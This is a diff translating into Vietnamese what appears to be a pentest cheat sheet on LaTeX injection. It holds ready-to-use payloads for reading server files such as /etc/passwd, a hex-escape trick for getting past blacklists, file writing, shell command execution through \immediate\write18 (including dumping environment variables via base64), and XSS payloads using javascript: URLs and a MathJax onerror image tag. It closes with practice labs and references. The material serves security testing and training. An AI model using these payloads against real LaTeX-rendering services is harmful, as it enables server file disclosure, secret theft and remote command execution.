@@ -1,31 +1,32 @@
 # LaTeX Injection
 
-> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place.
+> LaTeX Injection là một dạng tấn công injection trong đó nội dung độc hại được chèn vào các tài liệu LaTeX. LaTeX được sử dụng rộng rãi để soạn thảo và định dạng tài liệu, đặc biệt trong lĩnh vực học thuật, nhằm tạo ra các tài liệu khoa học và toán học có chất lượng cao. Do sở hữu các khả năng scripting mạnh mẽ, LaTeX có thể bị kẻ tấn công lợi dụng để thực thi các lệnh tùy ý nếu không được áp dụng các biện pháp bảo vệ phù hợp.
 
-## Summary
+## Tóm tắt
 
-* [File Manipulation](#file-manipulation)
-    * [Read File](#read-file)
-    * [Write File](#write-file)
-* [Command Execution](#command-execution)
+* [Thao tác với tệp](#file-manipulation)
+
+  * [Đọc tệp](#read-file)
+  * [Ghi tệp](#write-file)
+* [Thực thi lệnh](#command-execution)
 * [Cross Site Scripting](#cross-site-scripting)
-* [Labs](#labs)
-* [References](#references)
+* [Các bài lab](#labs)
+* [Tài liệu tham khảo](#references)
 
-## File Manipulation
+## Thao tác với tệp
 
-### Read File
+### Đọc tệp
 
-Attackers can read the content of sensitive files on the server.
+Kẻ tấn công có thể đọc nội dung của các tệp nhạy cảm trên máy chủ.
 
-Read file and interpret the LaTeX code in it:
+Đọc tệp và diễn giải mã LaTeX bên trong:
 
 ```tex
 \input{/etc/passwd}
-\include{somefile} # load .tex file (somefile.tex)
+\include{somefile} # tải tệp .tex (somefile.tex)
 ```
 
-Read single lined file:
+Đọc tệp chỉ có một dòng:
 
 ```tex
 \newread\file
@@ -35,7 +36,7 @@ Read single lined file:
 \closein\file
 ```
 
-Read multiple lined file:
+Đọc tệp có nhiều dòng:
 
 ```tex
 \lstinputlisting{/etc/passwd}
@@ -48,16 +49,14 @@ Read multiple lined file:
 \closein\file
 ```
 
-Read text file, **without** interpreting the content, it will only paste raw file content:
+Đọc tệp văn bản **mà không diễn giải nội dung**, chỉ chèn trực tiếp nội dung thô của tệp:
 
 ```tex
 \usepackage{verbatim}
 \verbatiminput{/etc/passwd}
 ```
 
-If injection point is past document header (`\usepackage` cannot be used), some control
-characters can be deactivated in order to use `\input` on file containing `$`, `#`,
-`_`, `&`, null bytes, ... (eg. perl scripts).
+Nếu điểm injection nằm sau phần header của tài liệu (`\usepackage` không thể được sử dụng), một số ký tự điều khiển có thể được vô hiệu hóa để sử dụng `\input` trên các tệp chứa `$`, `#`, `_`, `&`, byte null, ... (ví dụ các script Perl).
 
 ```tex
 \catcode `\$=12
@@ -67,18 +66,18 @@ characters can be deactivated in order to use `\input` on file containing `$`, `
 \input{path_to_script.pl}
 ```
 
-To bypass a blacklist try to replace one character with it's unicode hex value.
+Để bypass một blacklist, hãy thử thay thế một ký tự bằng giá trị hex Unicode của nó.
 
-* ^^41 represents a capital A
-* ^^7e represents a tilde (~) note that the ‘e’ must be lower case
+* `^^41` đại diện cho chữ A viết hoa
+* `^^7e` đại diện cho dấu ngã (~), lưu ý rằng ký tự ‘e’ phải viết thường
 
 ```tex
 \lstin^^70utlisting{/etc/passwd}
 ```
 
-### Write File
+### Ghi tệp
 
-Write single lined file:
+Ghi tệp chỉ có một dòng:
 
 ```tex
 \newwrite\outfile
@@ -89,16 +88,16 @@ Write single lined file:
 \closeout\outfile
 ```
 
-## Command Execution
+## Thực thi lệnh
 
-The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.
+Kết quả của lệnh sẽ được chuyển hướng đến stdout, do đó cần sử dụng một tệp tạm thời để lấy kết quả.
 
 ```tex
 \immediate\write18{id > output}
 \input{output}
 ```
 
-If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):
+Nếu gặp bất kỳ lỗi LaTeX nào, hãy cân nhắc sử dụng base64 để lấy kết quả mà không gặp vấn đề với các ký tự đặc biệt (hoặc sử dụng `\verbatiminput`):
 
 ```tex
 \immediate\write18{env | base64 > test.tex}
@@ -112,25 +111,25 @@ If you get any LaTex error, consider using base64 to get the result without bad 
 
 ## Cross Site Scripting
 
-From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
+Từ [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
 
 ```tex
 \url{javascript:alert(1)}
 \href{javascript:alert(1)}{placeholder}
 ```
 
-In [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)
+Trong [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)
 
 ```tex
 \unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
 ```
 
-## Labs
+## Các bài lab
 
 * [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
 * [Root Me - LaTeX - Command Execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)
 
-## References
+## Tài liệu tham khảo
 
 * [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://web.archive.org/web/20260209043241/https://0day.work/hacking-with-latex/)
 * [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://web.archive.org/web/20210117203905/https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
